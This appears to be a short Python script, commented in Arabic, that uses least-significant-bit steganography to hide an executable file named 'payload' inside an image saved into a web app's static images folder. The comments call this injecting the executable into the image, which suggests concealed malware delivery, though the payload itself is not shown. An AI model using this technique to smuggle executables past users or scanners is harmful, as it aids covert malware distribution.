from stegano import lsb

# مسار الصورة الأصلية
input_image = "app/static/images/original.jpg"
# مسار الصورة الناتجة بعد الحقن
output_image = "app/static/images/payload_image.png"
# محتوى الملف التنفيذي
payload_content = open("dist/payload", "rb").read()

# حقن الملف التنفيذي داخل الصورة
lsb.hide(input_image, payload_content.decode('latin-1')).save(output_image)
